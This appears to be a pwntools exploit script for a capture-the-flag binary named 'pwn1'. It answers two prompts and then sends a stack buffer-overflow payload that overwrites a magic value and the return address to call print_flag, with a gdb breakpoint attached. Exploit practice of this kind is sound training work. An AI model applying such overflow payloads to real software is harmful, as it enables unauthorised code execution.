# Import pwntools
from pwn import *

# Establish the target process
target = process('./pwn1')
elf = ELF('./pwn1')


# Make the payload

print_flag_fun = p32(elf.symbols['print_flag'])

payload = b""
payload += b"A"*43
payload += p32(0xdea110c9)
payload += b"B"*12
payload += b"C"*4 # overwrite ebp
payload += print_flag_fun

# Send the strings to reach the gets call
target.sendline("Sir Lancelot of Camelot")
target.sendline("To seek the Holy Grail.")

script = """
b *main+310
"""
gdb.attach(target, script)


# Send the payload
target.sendline(payload)

target.interactive()
